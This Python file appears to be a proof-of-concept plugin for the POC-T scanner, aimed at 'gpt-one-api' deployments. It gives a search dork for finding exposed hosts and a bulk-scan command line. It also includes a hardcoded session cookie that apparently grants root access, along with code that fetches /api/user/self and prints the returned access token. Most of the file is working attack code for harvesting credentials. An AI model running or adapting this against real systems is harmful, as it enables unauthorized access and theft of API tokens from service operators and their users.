#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   gpt-one-api_weakpass
@DateTime :  2023/9/22 21:28


@Dork
    icon_hash="597645654"

@Cmdline
    python POC-T.py -s gpt-one-api_access_token_weakpass -aF 'icon_hash="597645654"'

@Request
```
GET /api/token/?p=0
Cookie: session=MTY5NTk1MjA2NXxEWDhFQVFMX2dBQUJFQUVRQUFCc180QUFCQVp6ZEhKcGJtY01DQUFHYzNSaGRIVnpBMmx1ZEFRQ0FBSUdjM1J5YVc1bkRBUUFBbWxrQTJsdWRBUUNBQUlHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dHQUFSeWIyOTBCbk4wY21sdVp3d0dBQVJ5YjJ4bEEybHVkQVFEQVBfSXz-EdRkaFtCuJhD62iJBN2LsKJRU6YFwFZ6i-GxYAK1kw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36

```

@Expected Response
    $.success != false
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log
import json


def poc(url):
    HEADER = {
        # "Cookie": "session=MTY5NTk1MjA2NXxEWDhFQVFMX2dBQUJFQUVRQUFCc180QUFCQVp6ZEhKcGJtY01DQUFHYzNSaGRIVnpBMmx1ZEFRQ0FBSUdjM1J5YVc1bkRBUUFBbWxrQTJsdWRBUUNBQUlHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dHQUFSeWIyOTBCbk4wY21sdVp3d0dBQVJ5YjJ4bEEybHVkQVFEQVBfSXz-EdRkaFtCuJhD62iJBN2LsKJRU6YFwFZ6i-GxYAK1kw==",
        # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
    }

    url = urljoin_ex(url, "/api/user/self")
    resp = request_ex("get", url, headers=HEADER)
    if not resp:
        return False
    try:
        rj = resp.json()
    except:
        return False
    if rj and rj.get('data')and rj.get('data').get("access_token", False):
        print(rj.get('data').get("access_token"))
        return True

